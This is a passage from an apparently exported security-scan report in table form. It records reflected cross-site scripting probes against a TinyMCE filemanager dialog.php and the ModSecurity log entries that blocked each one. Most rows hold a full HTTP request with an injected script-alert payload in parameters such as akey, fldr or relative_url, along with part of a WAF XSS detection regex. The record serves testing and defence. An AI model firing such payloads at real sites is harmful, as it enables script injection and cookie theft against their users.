</td><td class=xl24 width=64 >2015-04-01 09:26:56</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:55 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(420399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsh6wQAW0AAD9hYNgAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsh6wQAW0AAD9hYNgAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366772</td><td class=xl24 width=64 >2015-03-31 18:57:22</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(457999)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ljjl5nml5tcv5mvirkbea5kk34
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:58</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:56 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(457999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsiKwQAW0AAHee9@gAAAAA&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsiKwQAW0AAHee9@gAAAAA</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366773</td><td class=xl24 width=64 >2015-03-31 18:57:41</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(662099)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=rv6g32fefnn11gbk9k6g7o20h7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:59</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:58 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(662099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsiqwQAW0AAHewA8wAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsiqwQAW0AAHewA8wAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366774</td><td class=xl24 width=64 >2015-03-31 18:59:25</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(713299)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28713299%29%2F; PHPSESSID=umsbopgj0lmo5e4f80jm4d7r25
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:00</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:59 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(713299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsi6wQAW0AABvT@GgAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsi6wQAW0AABvT@GgAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366775</td><td class=xl24 width=64 >2015-03-31 19:00:47</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey='&gt;&lt;script&gt;alert(758899)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=id3gerdke1dagh08jnaho8ndo7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:01</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:00 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(758899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsjKwQAW0AAHhB77AAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsjKwQAW0AAHhB77AAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366776</td><td class=xl24 width=64 >2015-03-31 19:01:46</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(185299)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=9surk6loaecrtrugmul7klg1a1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:03</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:01 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(185299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsjawQAW0AABt@bVcAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsjawQAW0AABt@bVcAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366777</td><td class=xl24 width=64 >2015-03-31 19:02:31</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(256699)&lt;/script&gt;&lt;!--&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28256699%29%2F; PHPSESSID=av2uiqo603sgt8n4k4110bvff6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:04</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:03 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(256699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsj6wQAW0AAHchlU8AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsj6wQAW0AAHchlU8AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366778</td><td class=xl24 width=64 >2015-03-31 19:04:15</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(758399)&lt;/script&gt;&lt;!--&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28758399%29%2F; PHPSESSID=ncfiudq86nr7nf28kk6vqlg6g1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:05</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:04 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(758399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtskKwQAW0AAHgzv0EAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtskKwQAW0AAHgzv0EAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366779</td><td class=xl24 width=64 >2015-03-31 19:05:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
